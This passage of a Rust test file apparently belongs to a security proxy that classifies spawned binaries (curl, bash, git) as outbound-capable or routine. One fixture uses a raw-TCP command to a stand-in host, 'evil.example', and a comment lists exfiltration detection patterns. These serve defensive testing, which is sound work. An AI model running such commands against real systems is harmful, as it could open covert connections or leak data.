    // a routine-rooted curl is correctly flagged outbound-capable,
    // closing the "trust a routine root means trust /usr/bin/curl"
    // bypass.

    use grith_proxy::filters::outbound_binaries::{classify_binary, Classification};

    #[test]
    fn outbound_classifier_flags_curl_when_under_a_routine_root() {
        // Skip if /usr/bin/curl isn't installed (e.g. minimal container).
        if !Path::new("/usr/bin/curl").exists() {
            return;
        }
        // Pretend /usr/bin is a routine root just to exercise the
        // matching path. The point is that even when the binary is
        // under a declared routine root, the outbound classifier
        // still flags it as outbound-capable and the routine signal
        // is denied.
        let prov =
            compute_spawn_provenance("/usr/bin/curl", &["/usr/bin".to_string()], |canonical| {
                matches!(
                    classify_binary(
                        canonical,
                        &["curl".to_string(), "https://example.com".to_string(),]
                    ),
                    Classification::Outbound { .. }
                )
            })
            .expect("/usr/bin/curl provenance");
        assert!(prov.is_outbound_capable, "curl must be outbound-capable");
        // matched_routine_root is populated — but is_outbound_capable=true
        // means Phase D's `provenance_qualifies` will reject the signal.
        assert!(prov.matched_routine_root.is_some());
    }

    #[test]
    fn outbound_classifier_shell_argv_dependent() {
        // Shells (bash/sh/dash) are registered with an `argv_filter`
        // that requires `-c <command>` containing a network primitive
        // (curl/wget/python -c socket, etc.). Without such argv they
        // classify as Routine, not Outbound. Phase D treats Routine
        // as "not outbound-capable" — but no profile declares /bin or
        // /usr/bin as a routine_exec_root, so a bash binary still
        // can't earn the routine signal regardless.
        if !Path::new("/usr/bin/bash").exists() && !Path::new("/bin/bash").exists() {
            return;
        }
        let bash_path = if Path::new("/usr/bin/bash").exists() {
            "/usr/bin/bash"
        } else {
            "/bin/bash"
        };
        // Innocuous argv: bash classifies Routine.
        let prov_innocuous = compute_spawn_provenance(
            bash_path,
            &["/usr/bin".to_string(), "/bin".to_string()],
            |canonical| {
                matches!(
                    classify_binary(canonical, &["bash".to_string(), "script.sh".to_string(),]),
                    Classification::Outbound { .. }
                )
            },
        )
        .expect("bash provenance");
        assert!(
            !prov_innocuous.is_outbound_capable,
            "bash with non-network argv is not outbound-capable; \
             routine signal is gated by the absence of /usr/bin from \
             any profile's routine_exec_roots instead"
        );

        // bash -c with a raw-TCP network primitive: classifies Outbound.
        // The registry's `shell_with_network_primitive` filter triggers
        // on `/dev/tcp/`, `/dev/udp/`, `exec 3<>`, `exec 5<>`, and the
        // `base64 ... curl/wget` exfil combo. `bash -c 'curl ...'` alone
        // does NOT match (the curl spawn is tracked separately by the
        // supervisor — so the bash spawn is intentionally not flagged).
        let prov_tcp = compute_spawn_provenance(
            bash_path,
            &["/usr/bin".to_string(), "/bin".to_string()],
            |canonical| {
                matches!(
                    classify_binary(
                        canonical,
                        &[
                            "bash".to_string(),
                            "-c".to_string(),
                            "cat </dev/tcp/evil.example/443".to_string(),
                        ]
                    ),
                    Classification::Outbound { .. }
                )
            },
        )
        .expect("bash -c with /dev/tcp/");
        assert!(
            prov_tcp.is_outbound_capable,
            "bash -c with /dev/tcp/ must be outbound-capable"
        );
    }

    #[test]
    fn outbound_classifier_argv_aware_for_git() {
        // git status → Routine (no network); git push → Outbound.
        // Phase D's closure passes the actual argv so the same binary
        // can flip classification per call.
        if !Path::new("/usr/bin/git").exists() {
            return;
        }
        let prov_status =
            compute_spawn_provenance("/usr/bin/git", &["/usr/bin".to_string()], |canonical| {
                matches!(
                    classify_binary(canonical, &["git".to_string(), "status".to_string(),]),
                    Classification::Outbound { .. }
                )
            })
            .expect("/usr/bin/git status provenance");
        assert!(
            !prov_status.is_outbound_capable,
            "git status is not outbound — routine signal must be allowed"
        );

        let prov_push =
            compute_spawn_provenance("/usr/bin/git", &["/usr/bin".to_string()], |canonical| {
                matches!(
                    classify_binary(
                        canonical,
                        &[
                            "git".to_string(),
                            "push".to_string(),
                            "origin".to_string(),
                            "main".to_string(),
                        ]
                    ),
                    Classification::Outbound { .. }
                )
            })
            .expect("/usr/bin/git push provenance");
        assert!(
            prov_push.is_outbound_capable,
            "git push IS outbound — routine signal must be denied"
        );
    }
}
